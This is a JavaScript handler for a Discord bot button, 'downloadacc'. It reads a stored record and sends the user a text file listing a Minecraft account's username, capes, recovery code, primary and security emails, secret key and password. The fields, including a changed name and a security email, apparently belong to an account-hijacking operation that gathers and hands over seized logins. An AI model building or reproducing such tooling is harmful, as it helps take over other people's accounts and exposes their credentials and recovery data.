const { AttachmentBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "downloadacc",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let copyTextId = interaction.customId.split("|")[1];
            const results = await queryParams("SELECT action FROM actions WHERE id = ?", [copyTextId]);

            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No action found for ID: ${copyTextId}`,
                    ephemeral: true,
                });
            }

            let [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = results[0].action.split("|");

            const fileContent =
`Username: ${newName}
Owns MC: ${mc}
Capes: ${Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None"}
Recovery Code: ${recoveryCode}
Primary Email: ${email}
Security Email: ${secEmail}
Secret Key: ${secretkey}
Password: ${password}`;

            const fileBuffer = Buffer.from(fileContent, 'utf-8');
            const attachment = new AttachmentBuilder(fileBuffer, { name: `${newName}.txt` });

            await interaction.reply({
                content: `${newName}`,
                files: [attachment],
                ephemeral: true,
            });
        } catch (error) {
            console.error("Error downloading account details:", error);
            return interaction.reply({
                content: "An error occurred while creating the file.",
                ephemeral: true,
            });
        }
    },
};
